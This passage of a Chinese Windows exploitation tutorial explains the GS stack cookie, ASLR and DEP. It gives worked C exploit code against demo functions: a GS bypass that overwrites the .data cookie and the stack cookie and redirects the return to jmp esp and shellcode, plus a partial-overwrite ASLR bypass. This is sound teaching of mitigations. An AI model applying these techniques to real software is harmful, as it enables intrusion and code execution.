
```void test(char *pSzInput)

{

00401030  push        ebp  
00401031  mov         ebp,esp 
00401033  sub         esp,4Ch 
00401036  mov         eax,dword ptr [___security_cookie (456020h)]  // 将Security Cookie赋值给eax
0040103B  xor         eax,ebp                       // 将eax与ebp的值异或
0040103D  mov         dword ptr [ebp-4],eax               // 将异或以后的结果赋给[ebp - 4]
00401040  push        ebx  
00401041  push        esi  
00401042  push        edi  
	char szStr[0x8] = { 0 };
00401043  mov         byte ptr [ebp-0Ch],0 
00401047  xor         eax,eax 
00401049  mov         dword ptr [ebp-0Bh],eax 
0040104C  mov         word ptr [ebp-7],ax 
00401050  mov         byte ptr [ebp-5],al 

	strcpy(szStr, pSzInput);
00401053  mov         eax,dword ptr [ebp+8] 
00401056  push        eax  
00401057  lea         ecx,[ebp-0Ch] 
0040105A  push        ecx  
0040105B  call        strcpy (4013F0h) 
00401060  add         esp,8 
}
00401063  pop         edi  
00401064  pop         esi  
00401065  pop         ebx  
00401066  mov         ecx,dword ptr [ebp-4]       // 取出[ebp - 4]的值赋给ecx
00401069  xor         ecx,ebp                  // 将ecx的值与ebp异或                      
0040106B  call        __security_check_cookie (4014F0h)  // 调用Security Check函数
00401070  mov         esp,ebp 
00401072  pop         ebp  
00401073  ret
```

由上内容可知，Security Cookie产生的细节如下：

- 系统以.data节的第一个双子作为Cookie的种子，或称原始Cookie（所有函数的Cookie都是用这个DWORD生成）
- 在程序每次运行时Cookie的种子都不同，因此种子有很强的随机性
- 在栈帧初始化以后系统用EBP异或种子，作为当前函数的Cookie，以此作为不同函数之间的区别，并增加Cookie的随机性
- 在函数返回前，用EBP还原出（异或）Cookie的种子

## 2.突破GS保护

由此可以知道，想要突破GS保护，需要同时对保存在.data中的Cookie和保存在栈中的Cookie进行修改。

考虑如下代码，此时的buf指针会指向一个堆空间，参数i因为是个有符号整型，因此当它为负数的时候依然会进入到if语句中，此时就可以通过计算堆变量的地址与.data节中保存的Security Cookie的地址来得出i值应该如何输入可以改变.data中的Security Cookie。

```void test(char *pSzInput, char *buf, int i)

{

	char szStr[0x8] = { 0 };

	if (i < 0x100)

	{

		*(PDWORD)(buf + i) = *(PDWORD)pSzInput;

		strcpy(szStr, pSzInput);

	}

}
```

经过调试器验证发现，申请的堆变量地址为`0x00455020`，Security Cookie的地址为`0x00460068`，两者相差`-0xB048`。因此，当参数i的值为`-0xB048`的时候，可以直接修改.data中保存的Security Cookie。此时，可以选择`0x90909090`作为修改以后的值，而同时还要获取程序在该函数运行到Security Check的时候寄存器ebp的值，这样才可以算出保存在栈中的Security Cookie的值。同样经过调试器验证发生，此时的ebp的值为`0x0012FDFC`，与写入的Security Cookie的值进行异或得到的值是`0x90826E90`。

只要将栈中的Security Cookie和.data中的Security Cookie的值修改到可以通过验证，剩下的工作就是最上面的修改返回地址为jmp esp的地址。最终完整的漏洞利用代码如下：

```int main()

{

	char *buf = (char *)malloc(0x10000);

	char szInput[0x100] = { 0 };

	int iSize = 4;

	LoadLibrary("user32.dll");	                        // MessageBox函数在该DLL中，需要将其导入才可以调用
	
	*(PDWORD)szInput = 0x90909090;	                        // 用来修改.data中的Security Cookie值
	memset(szInput + iSize, 'A', iSize);	                // 覆盖局部变量szStr
	*(PDWORD)(szInput + iSize + iSize) = 0x90826E90;	// 覆盖栈中的Security Cookie
	memset(szInput + iSize + iSize + iSize, 'B', iSize);	// 覆盖ebp
	*(PDWORD)(szInput + iSize + iSize + iSize + iSize) = 0x7C961EED;         // 覆盖返回地址为jmp esp指令地址
	strcpy(szInput + iSize + iSize + iSize + iSize + iSize, g_szShellCode);	 // 复制ShellCode
	
	test(szInput, buf, -0xB048);
	
	system("pause");

	return 0;

}
```

编译后程序后，在调试器中strcpy函数后面下断点，可以看到此时.data中的Security Cookie已经被成功修改为`0x90909090`，栈中的Security Cookie和返回地址也都被成功覆盖。

![](https://bbs.kanxue.com/upload/attach/202201/835440_TN3J3WHVYKAAJSA.jpg)

继续运行程序，可以看到在Security Check函数运行前，ecx的值已经变成`0x90909090`，因此此时不会触发GS保护。

![](https://bbs.kanxue.com/upload/attach/202201/835440_N74H75KX2NEFPV7.jpg)

继续向下运行，就会和上面一样，跳转到ShellCode处执行，弹出窗口。

# 六.ASLR安全机制

## 1.保护原理

利用栈溢出漏洞的时候，往往都需要确定一个明确的跳转指令地址。无论是jmp esp等通用跳板指令还是Ret2Libc使用的各指令，我们都需要先确定这条指令的入口点。微软的ASLR技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。

与SafeSEH类似，ASLR的实现也需要程序自身和操作系统的双重支持。支持ASLR的程序会在它的PE头中设置`IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE`标识来说明其支持ASLR，如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_RBAZ23PBHK76SJC.jpg)

微软从Visual Studio 2005 SP1开始加入了`/dynamicbase`链接选项来帮我们完成这个任务，我们只需要在编译程序的时候启用`/dynamicbase`链接选项，编译好的程序就支持ASLR了。在编译器中，只需要通过项目属性页 -> 配置属性 -> 链接器 -> 高级 -> 随机基址选项来对`/dynamicbase`链接选项进行设置，如下图所示：![](https://bbs.kanxue.com/upload/attach/202201/835440_D6R2CKQW4K3HQYX.jpg)

微软在系统中设置了映像随机开关，用户可以通过设置注册表中`HKEY_LOCAL_MACHINE\SYSTEM\CurrentSet\Control\Session Manager\Memory Management\MoveImages`的键值来设定映像随机化的工作模式：

- 设置为0时映像随机化禁用
- 设置为-1时强制对可随机化的映像进行处理，无论是否设置`IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE`标识
- 设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理

如果注册表中不存在，也可以新建一项，并根据需要进行设定，如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_TVHQ9TJ9QK3AP5R.jpg)

对于启用了ASLR机制的模块，在系统重启以后，其模块的加载基地址会发生改变，如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_QWGQ2TXSEDAFGKU.jpg)

开启ASLR的模块，其堆栈地址也会被随机化，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的，也就是说同一个程序任意两次运行时的堆栈基址是不同的，进而各变量在内存中的位置也就不确定。

例如，如下代码在是否启用ASLR的模块中的输出是不同的：

```void test()

{

	char szStr[0x4];

	char *pHead = (char *)malloc(0x4);

	printf("Stack Addr:0x%X\nHeap Addr:0x%X\n", (DWORD)szStr, (DWORD)pHead);

}
```

对于启用了ASLR的程序，其两次的堆栈地址是不同的。

![](https://bbs.kanxue.com/upload/attach/202201/835440_A8MY36S5C4WCWQA.jpg)

而如果关闭了ASLR，则在Win7系统上，栈地址会相同（如果是xp系统，堆地址也会相同）。

![](https://bbs.kanxue.com/upload/attach/202201/835440_VRTVZ4BSWYYC43T.jpg)

对于启用ASLR的程序，此时通过指定跳转指令地址的方式会由于系统的重启而失效。因此，需要通过将跳转地址设定为未启用ASLR模块中的地址才可以绕过ASLR保护机制。

但是一个程序中存在未启用ASLR的模块毕竟是少数，最好还是通过接下来介绍的利用部分覆盖进行定位内存的方式来绕过ASLR。

## 2.ASLR的绕过

之所以可以使用部分覆盖的方式绕过ASLR是因为ASLR只是随机化了映像的加载基址，而没有对指令序列进行随机化。比如说我们当前程序的`0x12345678`的位置找到了一个跳板指令，那么系统重启之后这个跳板指令的地址可能会变为`0x21345678`，也就是说这个地址的相对于基址的位置（后16位）是不变的，那么就可以通过修改后16位来一定程度上控制程序的运行。因此，只要在合适的位置找到了合适的跳板指令就可以绕过ASLR。

> 如果通过memcpy类的函数攻击的话就可以将后16位的偏移改为`0x0000~0xFFFF`中的任意一个；如果是通过strcpy来攻击的话，因此这类函数会在复制结束后自动添加`0x00`，所以此时可以控制的范围是`0x0000~0x00FF`

以下代码是通过memcpy函数为局部变量赋值的时候，存在栈溢出漏洞的代码：

```char g_szExploit[262] = { 0 };

void test()

{

	char szStr[256] = { 0 };
	
	memcpy(szStr, g_szExploit, 262);

}
```

首先编译程序，在调试中的memcpy下断点，可以看到栈变量到返回地址的偏移是`0x104`。

![](https://bbs.kanxue.com/upload/attach/202201/835440_Z39ZT7BM5Y2KS7Q.jpg)

由于此时是局部覆盖，因此，ShellCode需要保存在输入数据的前面，而在执行retn的时候，寄存器eax执行的就是局部变量szStr的地址，因此可以通过在当前模块中找到call / jmp eax的指令来实现功能，用该指令的偏移地址（后16位）来进行返回地址的覆盖。

![](https://bbs.kanxue.com/upload/attach/202201/835440_ZZ9PAHWFUF9BYR2.jpg)

可是经过调试，并没有发现模块中存在jmp / call eax的指令，所以就没有继续，附上半成品的利用代码。

```int main()

{

	LoadLibrary("user32.dll");		         // MessageBox函数在该DLL中，需要将其导入才可以调用

	memcpy(g_szExploit, g_szShellCode, sizeof(g_szShellCode));	// 复制ShellCode
	memset(g_szExploit + sizeof(g_szShellCode), 0x90, 0x104 - sizeof(g_szShellCode) - 2);	// 覆盖剩余空间
	*(PSHORT)(g_szExploit + 0x104 - 2) = 0xXXXX;	// 覆盖返回地址的偏移地址

	test();	

	system("pause");
	return 0;

}
```

# 七.DEP安全机制

## 1.保护原理

DEP的主要作用是阻止数据页（如默认的堆页，各种堆栈页以及内存池页）执行代码。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_4TCNQF7CG4ZXRZW.jpg)

DEP机制需要CPU的支持，AMD和Intel都为此作了设计，AMD称之为No-Execute Page-Protection(NX)，Intel称之为Execute Disable Bit(XD)，两者功能及工作原理在本质上是相同的。

操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表中加入特殊的标识位(NX/XD)来标识是否允许在该页上执行指令。

下图是Intel CPU在开启PAE分发模式情况下的PDE和PTE，可以看到此时的PDE和PTE最高位即XD位，当该为为1的时候，此时PTE所指向的物理页中保存的二进制数值不允许被用来当作指令执行。

![](https://bbs.kanxue.com/upload/attach/202201/835440_D96DRBU3PNHW7BE.jpg)

编译链接选项`/NXCOMPAT`是与DEP密切相关的程序链接选项，是在Visual Studio 2005及后续的版本中引入了一个链接选项，默认情况下是开启的。通过属性页 -> 配置属性 -> 链接器 -> 高级 -> 数据执行保护(DEP)来选择是否使用该编译选项。

![](https://bbs.kanxue.com/upload/attach/202201/835440_PSEKHHAWGHAWH84.jpg)

采用`/NXCOMPAT`编译的程序会在文件的PE头中设置`IMAGE_DLLCHARACTERISTICS_NX_COMPAT`标识，该标识通过可选头中的DllCharacteristics变量进行体现，当DllCharacterstics带有`0x100`的时候，则表示该程序采用了`/NXCOMPAT`编译，如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_QYGNJ6BW4XN5PT8.jpg)

当系统中开启了DEP保护机制，此时尽管程序成功跳转到shellcode，也会抛出以下的异常，阻止程序的允许，导致shellcode运行失败

![](https://bbs.kanxue.com/upload/attach/202201/835440_QTHRG5QN7EH9ZZD.jpg)

在DEP保护下溢出失败的根本原因是DEP检测到程序到程序转到非可执行页执行指令了，如果我们让程序跳到一个已经存在的系统函数中结果会是怎么样呢？已经存在的系统函数必然存在于可执行页上，所以此时DEP是不会拦截的，Ret2libc攻击的原理也正是基于此的。
